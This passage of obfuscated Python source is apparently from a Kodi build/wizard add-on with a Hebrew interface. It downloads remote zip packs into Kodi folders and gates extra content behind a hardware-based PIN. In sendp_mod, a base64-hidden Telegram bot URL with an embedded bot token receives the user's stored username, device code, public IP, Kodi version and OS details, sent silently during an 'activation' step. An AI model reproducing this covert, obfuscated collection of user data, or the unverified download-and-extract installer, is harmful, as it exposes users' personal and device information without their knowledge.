          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:4681
      if xbmc .getCondVisibility ('system.platform.android')and KODIV <=18 and KODIV >=17 :#line:4682
       xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:4683
       xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:4684
def kodi17_18pack ():#line:4688
    OO00O0OOO0OOO00O0 ='https://github.com/vip200/Build/blob/master/17pack.zip?raw=true'#line:4689
    O0O0OO000000O0OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4690
    O000OO0O000O000OO =os .path .join (PACKAGES ,'isr.zip')#line:4693
    O00O00O00O00O0O00 =Request (OO00O0OOO0OOO00O0 )#line:4694
    OOOOO000O00O0O00O =urlopen (O00O00O00O00O0O00 )#line:4695
    O0OO0OO00O00O0000 =xbmcgui .DialogProgress ()#line:4697
    O0OO0OO00O00O0000 .create ("[B][COLOR=yellow]מוריד חבילת קבצים[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]")#line:4698
    O0OO0OO00O00O0000 .update (0 )#line:4699
    O0OO000O000OOO000 =open (O000OO0O000O000OO ,'wb')#line:4701
    try :#line:4703
      OOO0OOOOOOO0OO00O =OOOOO000O00O0O00O .info ().getheader ('Content-Length').strip ()#line:4704
      OOOOO0000000O00O0 =True #line:4705
    except AttributeError :#line:4706
          OOOOO0000000O00O0 =False #line:4707
    if OOOOO0000000O00O0 :#line:4709
          OOO0OOOOOOO0OO00O =int (OOO0OOOOOOO0OO00O )#line:4710
    OO000000OOOO0O0O0 =0 #line:4712
    OOO0O000O0O0OO000 =time .time ()#line:4713
    while True :#line:4714
          OOO0O0O0000O0OOOO =OOOOO000O00O0O00O .read (8192 )#line:4715
          if not OOO0O0O0000O0OOOO :#line:4716
              sys .stdout .write ('\n')#line:4717
              break #line:4718
          OO000000OOOO0O0O0 +=len (OOO0O0O0000O0OOOO )#line:4720
          O0OO000O000OOO000 .write (OOO0O0O0000O0OOOO )#line:4721
          if not OOOOO0000000O00O0 :#line:4723
              OOO0OOOOOOO0OO00O =OO000000OOOO0O0O0 #line:4724
          if O0OO0OO00O00O0000 .iscanceled ():#line:4725
             O0OO0OO00O00O0000 .close ()#line:4726
             try :#line:4727
              os .remove (O000OO0O000O000OO )#line:4728
             except :#line:4729
              pass #line:4730
             break #line:4731
          O0O0O00OO0O0O00OO =float (OO000000OOOO0O0O0 )/OOO0OOOOOOO0OO00O #line:4732
          O0O0O00OO0O0O00OO =round (O0O0O00OO0O0O00OO *100 ,2 )#line:4733
          OO0OO00OO00O0O0O0 =OO000000OOOO0O0O0 /(1024 *1024 )#line:4734
          OOOOO00000O0OO00O =OOO0OOOOOOO0OO00O /(1024 *1024 )#line:4735
          O0O00OOOOO00OO00O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0OO00OO00O0O0O0 ,'teal',OOOOO00000O0OO00O )#line:4736
          if (time .time ()-OOO0O000O0O0OO000 )>0 :#line:4738
            OO00O0OO0O0OO0000 =OO000000OOOO0O0O0 ,(time .time ()-OOO0O000O0O0OO000 )#line:4739
            OO00O0OO0O0OO0000 =OO00O0OO0O0OO0000 ,1024 #line:4740
          else :#line:4741
           OO00O0OO0O0OO0000 =0 #line:4742
          OO0OOOO00O0O0OO0O ='KB'#line:4743
          if OO00O0OO0O0OO0000 >=1024 :#line:4744
             OO00O0OO0O0OO0000 =OO00O0OO0O0OO0000 ,1024 #line:4745
             OO0OOOO00O0O0OO0O ='MB'#line:4746
          if OO00O0OO0O0OO0000 >0 and not O0O0O00OO0O0O00OO ==100 :#line:4747
              OOO00O0O000O00000 =(OOO0OOOOOOO0OO00O -OO000000OOOO0O0O0 ),OO00O0OO0O0OO0000 #line:4748
          else :#line:4749
              OOO00O0O000O00000 =0 #line:4750
          OO0OOO0O000O00000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',0 ,OO0OOOO00O0O0OO0O )#line:4751
          O0OO0OO00O00O0000 .update (int (O0O0O00OO0O0O00OO ),"[B][COLOR=green]מוריד חבילת קבצים לקודי 17 - 18 [/COLOR][/B]",O0O00OOOOO00OO00O ,OO0OOO0O000O00000 )#line:4753
    O0O0O0O0OOO0O00OO =xbmc .translatePath (os .path .join ('special://home'))#line:4756
    O0OO000O000OOO000 .close ()#line:4759
    extract .all (O000OO0O000O000OO ,O0O0O0O0OOO0O00OO ,O0OO0OO00O00O0000 )#line:4760
    try :#line:4764
      os .remove (O000OO0O000O000OO )#line:4765
    except :#line:4766
      pass #line:4767
def linux_pack ():#line:4768
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מוריד קבצים למערכת הפעלה לינוקס[/COLOR]'%COLOR2 )#line:4770
    OOO000OOOOO00OOO0 =" Kodi Premium"#line:4773
    O0000000OOOOO0OOO ='http://kodi.life/linux/pack.zip'#line:4774
    O000OO0O0000O0OOO =OOO000OOOOO00OOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4775
    if not wiz .workingURL (O0000000OOOOO0OOO )==True :return #line:4776
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4777
    try :#line:4778
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOO000OOOOO00OOO0 ),'','אנא המתן')#line:4779
    except :#line:4780
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOO000OOOOO00OOO0 ))#line:4781
    OOOOOOOOO0OO00O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O000OO0O0000O0OOO )#line:4782
    try :os .remove (OOOOOOOOO0OO00O00 )#line:4783
    except :pass #line:4784
    if 'google'in O0000000OOOOO0OOO :#line:4786
       googledrive_download (O0000000OOOOO0OOO ,OOOOOOOOO0OO00O00 ,DP ,wiz .checkBuild (OOO000OOOOO00OOO0 ,'updatesize'))#line:4787
    else :#line:4789
      downloader .download (O0000000OOOOO0OOO ,OOOOOOOOO0OO00O00 ,DP )#line:4790
    xbmc .sleep (100 )#line:4791
    OO0OOO00OOO0OO0OO ='מעדכן קבצים'#line:4792
    O0OOO00O00O000O0O ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOO00OOO0OO0OO )#line:4793
    try :#line:4794
        DP .update (0 ,O0OOO00O00O000O0O ,'','אנא המתן')#line:4795
    except :#line:4796
        DP .update (0 ,O0OOO00O00O000O0O +'\n'+''+'\n'+'אנא המתן')#line:4797
    extract .all (OOOOOOOOO0OO00O00 ,HOME ,DP ,title =O0OOO00O00O000O0O )#line:4798
    DP .close ()#line:4799
    if INSTALLMETHOD ==1 :O00O000O0OO0O00O0 =1 #line:4801
    elif INSTALLMETHOD ==2 :O00O000O0OO0O00O0 =0 #line:4802
    else :DP .close ()#line:4803
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הושלם![/COLOR]'%COLOR2 )#line:4804
def sendp_mod (OO0OOO0000O0OO0O0 ):#line:4805
          import json ,requests #line:4807
          import platform as plat #line:4808
          O0O00O000O0OOO0O0 =(wiz .getS ("user"))#line:4811
          O0OO0000000O0O000 =(wiz .getS ("pass"))#line:4812
          O00O0O0O00O0000O0 =plat .uname ()#line:4813
          OO0O000OO0O0O00O0 =O00O0O0O00O0000O0 [1 ]#line:4814
          OOO00O00OO0O000O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:4815
          OOO00O0OO00O0OO00 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUyMzY2MjUxODY6QUFGWWswSVBCdTROWjJ1WmxQWXpidVA5NkZyZ1B0UDhnUU0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTc4ODIyNzI2MSZ0ZXh0PQ==').decode ('utf-8')#line:4816
          O0000OOOO0000OO0O =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:4818
          O00OOOOO0O00000OO =O0O00O000O0OOO0O0 #line:4820
          O0OOOOOOOO00000OO =OO0OOO0000O0OO0O0 #line:4821
          O00OO00O00OOO00O0 =requests .get (OOO00O0OO00O0OO00 +que ('בקשה לפתיחת תוכן טורקי: ')+O0OOOOOOOO00000OO +que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O00OOOOO0O00000OO +que (' קודי: ')+OOO00O00OO0O000O0 +que (' כתובת: ')+O0000OOOO0000OO0O +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+OO0O000OO0O0O00O0 ).json ()#line:4823
          O00OO00O00OOO00O0 =requests .get (OOO00O0OO00O0OO00 +'@@@'+O0OOOOOOOO00000OO ).json ()#line:4824
def install_turkey ():#line:4826
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]מוריד חיבלת תוכן טורקי[/COLOR]'%COLOR2 )#line:4828
    OOO0O000O0OOO0OOO ="Dragon Turkey"#line:4831
    O0000O0O000O0OOOO ='https://github.com/vip200/victory/blob/master/plugin.video.dreamspeed.zip?raw=true'#line:4832
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4835
    try :#line:4836
        DP .create ('Dragon Turkey','[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOO0O000O0OOO0OOO ),'','אנא המתן')#line:4837
    except :#line:4838
        DP .create ('Dragon Turkey','[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOO0O000O0OOO0OOO ))#line:4839
    OO00O000OO0O00OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO0O000O0OOO0OOO )#line:4840
    try :os .remove (OO00O000OO0O00OOO )#line:4841
    except :pass #line:4842
    if 'google'in O0000O0O000O0OOOO :#line:4844
       googledrive_download (O0000O0O000O0OOOO ,OO00O000OO0O00OOO ,DP ,wiz .checkBuild (OOO0O000O0OOO0OOO ,'updatesize'))#line:4845
    else :#line:4847
      downloader .download (O0000O0O000O0OOOO ,OO00O000OO0O00OOO ,DP )#line:4848
    xbmc .sleep (100 )#line:4849
    OO0O0OO0000O0OOO0 ='מעדכן קבצים'#line:4850
    O0O0O0O0000OO00OO ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0OO0000O0OOO0 )#line:4851
    try :#line:4852
        DP .update (0 ,O0O0O0O0000OO00OO ,'','אנא המתן')#line:4853
    except :#line:4854
        DP .update (0 ,O0O0O0O0000OO00OO +'\n'+''+'\n'+'אנא המתן')#line:4855
    extract .all (OO00O000OO0O00OOO ,ADDONS ,DP ,title =O0O0O0O0000OO00OO )#line:4856
    try :#line:4857
        open_dragon_menu_hub ()#line:4858
    except Exception as OOO0O0OOOO00OO00O :#line:4859
                    logging .warning ('dragon hub errrrrrrror'+str (OOO0O0OOOO00OO00O ))#line:4860
    DP .close ()#line:4861
def disply_hwr3 ():#line:4862
    from datetime import date #line:4863
    O0000O000O0OOO000 =date .today ()#line:4865
    O00O0O0OO0O0O0O0O =str (O0000O000O0OOO000 ).split ('-')[2 ]#line:4866
    O0O0O0OO0OOOOO00O =tmdb_list (TMDB_NEW_API2 )#line:4868
    OOOO0O0OOOO0O00O0 =str ((getHwAddr ('eth0'))*O0O0O0OO0OOOOO00O )#line:4869
    OO0O00OO0O000OOO0 =(OOOO0O0OOOO0O00O0 [1 ]+OOOO0O0OOOO0O00O0 [2 ]+O00O0O0OO0O0O0O0O )#line:4870
    sendp_mod (OO0O00OO0O000OOO0 )#line:4872
def install_turkey_bot ():#line:4873
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]מוריד חיבלת תוכן טורקי[/COLOR]'%COLOR2 )#line:4875
    O00O0000OOOOOO00O ="Dragon Turkey"#line:4878
    OOOO00O0OOOOOOOO0 ='https://github.com/vip200/victory/blob/master/plugin.video.dreamspeed.zip?raw=true'#line:4879
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4882
    try :#line:4883
        DP .create ('Dragon Turkey','[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O00O0000OOOOOO00O ),'','אנא המתן')#line:4884
    except :#line:4885
        DP .create ('Dragon Turkey','[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O00O0000OOOOOO00O ))#line:4886
    OOOOO0O0O0OO00OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O0000OOOOOO00O )#line:4887
    if 'google'in OOOO00O0OOOOOOOO0 :#line:4889
       googledrive_download (OOOO00O0OOOOOOOO0 ,OOOOO0O0O0OO00OOO ,DP ,wiz .checkBuild (O00O0000OOOOOO00O ,'updatesize'))#line:4890
    else :#line:4892
      downloader .download (OOOO00O0OOOOOOOO0 ,OOOOO0O0O0OO00OOO ,DP )#line:4893
    xbmc .sleep (100 )#line:4894
    O00OO00OOO0OO0000 ='מעדכן קבצים'#line:4895
    O0O0O0000OO0O00OO ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO00OOO0OO0000 )#line:4896
    try :#line:4897
        DP .update (0 ,O0O0O0000OO0O00OO ,'','אנא המתן')#line:4898
    except :#line:4899
        DP .update (0 ,O0O0O0000OO0O00OO +'\n'+''+'\n'+'אנא המתן')#line:4900
    extract .all (OOOOO0O0O0OO00OOO ,ADDONS ,DP ,title =O0O0O0000OO0O00OO )#line:4901
    DP .close ()#line:4902
    xbmc .sleep (100 )#line:4904
    try :os .remove (OOOOO0O0O0OO00OOO )#line:4905
    except :pass #line:4906
    wiz .kodi17Fix ()#line:4907
def get_pincode (OO0O00OO0OO00O00O ):#line:4908
    O0000OOO00O00OOOO =time .time ()+300 #line:4910
    while (OO0O00OO0OO00O00O =='empty'or OO0O00OO0OO00O00O ==None ):#line:4911
          wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon'),'[COLOR %s]המתן לתגובה מ Dragon[/COLOR]'%COLOR2 )#line:4912
          OO0O00OO0OO00O00O =telecode ()#line:4913
          if time .time ()>O0000OOO00O00OOOO :#line:4914
            OO0O00OO0OO00O00O ='play_tele'#line:4915
    return OO0O00OO0OO00O00O #line:4916
def open_turkey ():#line:4918
    if wiz .getS ("dragon")=='true':#line:4919
        try :#line:4920
            OOOOO00OO0OOO0O00 =xbmcgui .DialogBusy ()#line:4921
            OOOOO00OO0OOO0O00 .create ()#line:4922
        except :#line:4923
           xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:4924
        OO0O00000OO00000O =xbmcgui .Dialog ()#line:4925
        O0OOOO0O0O00O0000 =OO0O00000OO00000O .yesno ('Dragon Turkey',"התהליך מתבצע פחות מדקה, להמשך לחצו אישור.",yeslabel ="[B][COLOR WHITE]אישור[/COLOR][/B]",nolabel ="[B][COLOR white]ביטול[/COLOR][/B]")#line:4926
        if O0OOOO0O0O00O0000 ==0 :#line:4927
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:4928
            sys .exit ()#line:4929
        else :#line:4930
            from datetime import date #line:4932
            OOOO000000O000O0O =date .today ()#line:4934
            O00OOO00000000O00 =str (OOOO000000O000O0O ).split ('-')[2 ]#line:4935
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]מבצע אימות, המתן...[/COLOR]'%COLOR2 )#line:4936
            from math import sqrt #line:4938
            OOOO0OOO0OOO0OO00 =tmdb_list (TMDB_NEW_API2 )#line:4939
            OOO0O0O00O0OO0O00 =str ((getHwAddr ('eth0'))*OOOO0OOO0OOO0OO00 )#line:4940
            O0O0O00000O0OOO00 =int (OOO0O0O00O0OO0O00 [1 ]+OOO0O0O00O0OO0O00 [2 ]+O00OOO00000000O00 )#line:4941
            O0OOO00000O00O00O =(str (round (sqrt ((O0O0O00000O0OOO00 *200 )+40 )+40 ,4 ))[-4 :]).replace ('.','')#line:4942
            if '.'in O0OOO00000O00O00O :#line:4943
             O0OOO00000O00O00O =(str (round (sqrt ((O0O0O00000O0OOO00 *200 )+40 )+40 ,4 ))[-5 :]).replace ('.','')#line:4944
            disply_hwr3 ()#line:4945
            O00O0O00O00000O0O =get_pincode (code_link )#line:4952
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:4953
            if O00O0O00O00000O0O ==O0OOO00000O00O00O :#line:4954
                install_turkey_bot ()#line:4955
                try :#line:4956
                    open_dragon_menu_hub ()#line:4957
                except Exception as O000000O000OO0O0O :#line:4958
                                logging .warning ('dragon hub errrrrrrror'+str (O000000O000OO0O0O ))#line:4959
                wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]התוכן נפתח![/COLOR]'%COLOR2 )#line:4960
            else :#line:4961
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]אין גישה לתוכן[/COLOR]'%COLOR2 )#line:4962
              sys .exit ()#line:4963
    else :#line:4964
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]לא פעיל[/COLOR]'%COLOR2 )#line:4965
def telemedia5 ():#line:4966
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מוריד טלמדיה לאנדרואיד 5[/COLOR]'%COLOR2 )#line:4967
    O000O0O0O000O00O0 =" Kodi Premium"#line:4970
    OOOO0OOOOOOOO0OO0 ='http://kodi.life/telemedia/telemedia.zip'#line:4971
    OO0OOOO0OOO0O00O0 =O000O0O0O000O00O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4972
    if not wiz .workingURL (OOOO0OOOOOOOO0OO0 )==True :return #line:4973
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4974
    try :#line:4975
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O000O0O0O000O00O0 ),'','אנא המתן')#line:4976
    except :#line:4977
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O000O0O0O000O00O0 ))#line:4978
    O0000O000O00OOOO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0OOOO0OOO0O00O0 )#line:4979
    try :os .remove (O0000O000O00OOOO0 )#line:4980
    except :pass #line:4981
    if 'google'in OOOO0OOOOOOOO0OO0 :#line:4983
       googledrive_download (OOOO0OOOOOOOO0OO0 ,O0000O000O00OOOO0 ,DP ,wiz .checkBuild (O000O0O0O000O00O0 ,'updatesize'))#line:4984
    else :#line:4986
      downloader .download (OOOO0OOOOOOOO0OO0 ,O0000O000O00OOOO0 ,DP )#line:4987
    xbmc .sleep (100 )#line:4988
    OOOOO00000O0OOOOO ='מעדכן קבצים'#line:4989
    OO000O000OO0O00OO ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOO00000O0OOOOO )#line:4990
    try :#line:4991
        DP .update (0 ,OO000O000OO0O00OO ,'','אנא המתן')#line:4992
    except :#line:4993
        DP .update (0 ,OO000O000OO0O00OO +'\n'+''+'\n'+'אנא המתן')#line:4994
    extract .all (O0000O000O00OOOO0 ,HOME ,DP ,title =OO000O000OO0O00OO )#line:4995
    DP .close ()#line:4996
    if INSTALLMETHOD ==1 :OO0OOOO000000O000 =1 #line:4998
    elif INSTALLMETHOD ==2 :OO0OOOO000000O000 =0 #line:4999
    else :DP .close ()#line:5000
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הושלם![/COLOR]'%COLOR2 )#line:5001
def testnotify ():#line:5006
    try :#line:5007
        O0OOO0O00OO0O0000 =xbmcgui .DialogBusy ()#line:5008
        O0OOO0O00OO0O0000 .create ()#line:5009
    except :#line:5010
       xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:5011
    OO0O0O00000O00O00 =wiz .workingURL (NOTIFICATION )#line:5012
    if OO0O0O00000O00O00 ==True :#line:5013
        try :#line:5014
            O0O0OO0OOO0000OO0 ,O000OO0000O00O0OO =wiz .splitNotify (NOTIFICATION )#line:5015
            if O0O0OO0OOO0000OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון [/COLOR]"%COLOR2 );return #line:5016
            if wiz .STARTP ()=='ok':#line:5017
                notify .notification (O000OO0000O00O0OO ,True )#line:5019
        except Exception as OOOO00O000O0OO0OO :#line:5020
            wiz .log ("Error on Notifications Window: %s"%str (OOOO00O000O0OO0OO ),5 )#line:5021
    else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון[/COLOR]"%COLOR2 )#line:5022
    xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:5023
def testnotify2 ():#line:5024
	O00O0O0OOOOOOO0OO =wiz .workingURL (NOTIFICATION2 )#line:5025
	if O00O0O0OOOOOOO0OO ==True :#line:5026
		try :#line:5027
			OO0OOO00OOOOOOOO0 ,O0OO0000O0000OOOO =wiz .splitNotify (NOTIFICATION2 )#line:5028
			if OO0OOO00OOOOOOOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון[/COLOR]"%COLOR2 );return #line:5029
			if wiz .STARTP ()=='ok':#line:5030
				notify .notification2 (O0OO0000O0000OOOO ,True )#line:5031
		except Exception as OO00O0OOO0OO0OOO0 :#line:5032
			wiz .log ("Error on Notifications Window: %s"%str (OO00O0OOO0OO0OOO0 ),5 )#line:5033
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון [/COLOR]"%COLOR2 )#line:5034
def testnotify3 ():#line:5035
	O0O0O0O000000OOO0 =wiz .workingURL (NOTIFICATION3 )#line:5036
	if O0O0O0O000000OOO0 ==True :#line:5037
		try :#line:5038
			O000OO00OOO0O0OO0 ,OOOOO0000O00OO00O =wiz .splitNotify (NOTIFICATION3 )#line:5039
			if O000OO00OOO0O0OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5040
			if wiz .STARTP ()=='ok':#line:5041
				notify .notification3 (OOOOO0000O00OO00O ,True )#line:5042
		except Exception as OO0OOOO000000O0OO :#line:5043
			wiz .log ("Error on Notifications Window: %s"%str (OO0OOOO000000O0OO ),5 )#line:5044
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5045
def wait ():#line:5046
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:5047
def infobuild (test =''):#line:5048
    try :#line:5051
        OO000O0OOO00O00OO ,O0OOOOOOO0OOOOO0O =wiz .splitNotify (NOTIFICATION )#line:5052
        if OO000O0OOO00O00OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5053
        notify .updateinfo (O0OOOOOOO0OOOOO0O ,test )#line:5055
    except Exception as O00OOO0O0O0O00O0O :#line:5056
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5057
def infoupdate_busydialog (test =''):#line:5060
    try :#line:5061
        xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:5062
        O0O000OO00O0O0OO0 ,OOO0OOO00O0O0O0O0 =wiz .splitNotify (NOTIFICATION )#line:5063
        notify .updateinfo (OOO0OOO00O0O0O0O0 ,test )#line:5064
        xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:5065
    except Exception as OOO0O0000OOO0OO00 :#line:5066
        xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:5067
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין מידע[/COLOR]"%COLOR2 )#line:5068
def servicemanual ():#line:5069
	O0O0OO0000OOO0OO0 =wiz .workingURL (HELPINFO )#line:5070
	if O0O0OO0000OOO0OO0 ==True :#line:5071
		try :#line:5072
			OO00O0OO000OOO00O ,OO0O000O0OOO000OO =wiz .splitNotify (HELPINFO )#line:5073
			if OO00O0OO000OOO00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5074
			notify .helpinfo (OO0O000O0OOO000OO ,True )#line:5075
		except Exception as O000OOOOO0O00OOOO :#line:5076
			wiz .log ("Error on Notifications Window: %s"%str (O000OOOOO0O00OOOO ),5 )#line:5077
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5078
def testupdate ():#line:5080
	if BUILDNAME =="":#line:5081
		notify .updateWindow ()#line:5082
	else :#line:5083
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5084
def testfirst ():#line:5086
	notify .firstRun ()#line:5087
def testfirstRun ():#line:5089
	notify .firstRunSettings ()#line:5090
def fastinstall ():#line:5093
	notify .firstRuninstall ()#line:5094
def addDir (OOO00O00OO0OOO000 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5101
    O00OO000OOO00O00O =sys .argv [0 ]#line:5102
    if not mode ==None :O00OO000OOO00O00O +="?mode=%s"%que (mode )#line:5103
    if not name ==None :O00OO000OOO00O00O +="&name="+que (name )#line:5104
    if not url ==None :O00OO000OOO00O00O +="&url="+que (url )#line:5105
    OO0OOO0OOOOOOO00O =True #line:5106
    if themeit :OOO00O00OO0OOO000 =themeit %OOO00O00OO0OOO000 #line:5107
    try :#line:5108
      O000OOOO0OO00O000 =xbmcgui .ListItem (OOO00O00OO0OOO000 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5109
    except :#line:5110
      O000OOOO0OO00O000 =xbmcgui .ListItem (OOO00O00OO0OOO000 )#line:5111
      O000OOOO0OO00O000 .setArt ({'thumb':icon ,'fanart':icon ,'DefaultFolder.png':icon })#line:5112
    O000OOOO0OO00O000 .setInfo (type ="Video",infoLabels ={"Title":OOO00O00OO0OOO000 ,"Plot":description })#line:5113
    O000OOOO0OO00O000 .setProperty ("Fanart_Image",fanart )#line:5114
    if not menu ==None :O000OOOO0OO00O000 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5115
    OO0OOO0OOOOOOO00O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00OO000OOO00O00O ,listitem =O000OOOO0OO00O000 ,isFolder =True )#line:5116
    return OO0OOO0OOOOOOO00O #line:5117
def addFile (OOOOO0O0000O00OOO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5119
    OO00OOOO0OO0000OO =sys .argv [0 ]#line:5120
    try :#line:5121
        if not mode ==None :OO00OOOO0OO0000OO +="?mode=%s"%que (mode )#line:5122
        if not name ==None :OO00OOOO0OO0000OO +="&name="+que (name )#line:5123
        if not url ==None :OO00OOOO0OO0000OO +="&url="+que (url )#line:5124
    except :#line:5125
        if not mode ==None :OO00OOOO0OO0000OO +="?mode=%s"%que (mode )#line:5126
        if not name ==None :OO00OOOO0OO0000OO +="&name="+que (name )#line:5127
        if not url ==None :OO00OOOO0OO0000OO +="&url="+que (url )#line:5128
    OO0O0O0OO00O0000O =True #line:5129
    if themeit :OOOOO0O0000O00OOO =themeit %OOOOO0O0000O00OOO #line:5130
    try :#line:5131
        O0O00OOOO0OO00OOO =xbmcgui .ListItem (OOOOO0O0000O00OOO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5132
    except :#line:5133
        O0O00OOOO0OO00OOO =xbmcgui .ListItem (OOOOO0O0000O00OOO )#line:5134
        O0O00OOOO0OO00OOO .setArt ({'thumb':icon ,'fanart':icon ,'DefaultFolder.png':icon })#line:5135
    O0O00OOOO0OO00OOO .setInfo (type ="Video",infoLabels ={"Title":OOOOO0O0000O00OOO ,"Plot":description })#line:5136
